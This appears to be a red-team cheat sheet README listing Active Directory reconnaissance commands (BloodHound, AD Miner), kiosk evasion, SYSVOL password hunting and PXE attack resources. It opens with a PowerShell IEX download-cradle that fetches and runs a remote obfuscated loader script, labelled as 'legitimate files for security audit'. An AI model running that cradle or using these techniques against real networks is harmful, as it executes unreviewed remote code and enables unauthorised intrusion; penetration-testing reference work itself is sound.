### Legitimate files for security audit

$key need to be set

```
IEX(New-Object Net.WebClient).downloadstring('https://raw.githubusercontent.com/TikTakTech/Salsa/main/KP_Obf_LOAD_Menu.ps1')
```

# CYBER CHEAT SHEET

---
### DIVERS
---
**Global Ressources :**
- https://viperone.gitbook.io/pentest-everything
- https://book.hacktricks.xyz/
- https://atomicredteam.io/atomics/
- https://github.com/S3cur3Th1sSh1t/

**Kiosk evasion** : file access from browser or openfile dialogbox
```
file://c:/windows/system32/calc.exe
```

**Recent user activity**
```
C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Recent
```

**Url file attack**
- https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication
- https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/forced-coercion/url-file-attack
- https://github.com/mdsecactivebreach/Farmer
- https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/

**NTLM**
- https://www.scip.ch/en/?labs.20210909

<br/><br/>

---
### OSINT - PASSWORD
---

- https://haveibeenpwned.com/
- https://breachdirectory.org/

<br/><br/>

---
### AD
---
**SYSVOL acces without serveur name :**
```
\\mon-domaine.fr\sysvol
```
**Searching Password in GPO with explorer :**

![image](https://github.com/TikTakTech/Salsa/assets/114105972/45e450e0-3a09-4da1-89d0-24db9bc8adb7)

<br/><br/>

---
### RECONNAISSANCE - ENUMERATION
---

**BloodHound :**
```
bloodhound-python -d domain -u username@domain -p password -c all -ns domain_controller_ip -v
sudo apt install bloodhound
sudo neo4j console
http://localhost:7474/
(neo4j/neo4j)
bloodhound
```
https://medium.com/@leviathan36/active-directory-testing-with-bloodhound-a33b88622d2f

**ADMiner :**
```
pipx install 'git+https://github.com/Mazars-Tech/AD_Miner.git'
reopen shell ;-)
AD-miner -c -cf My_Report -u neo4j -p mypassword
```
https://github.com/Mazars-Tech/AD_Miner
<br/><br/>

---
### MEMCM - MDT - PXE
*******

Ressources :

- https://www.secura.com/blog/attacking-mitigating-windows-pxe-environments
- https://www.netspi.com/blog/technical-blog/network-penetration-testing/attacks-against-windows-pxe-boot-images/
- https://www.riskinsight-wavestone.com/en/2020/01/taking-over-windows-workstations-pxe-laps/
- https://connect.ed-diamond.com/MISC/misc-103/compromission-des-postes-de-travail-grace-a-laps-et-pxe
- https://www.acceis.fr/sattaquer-aux-images-pxe/
- https://github.com/wavestone-cdt/powerpxe
- https://tryhackme.com/r/room/breachingad
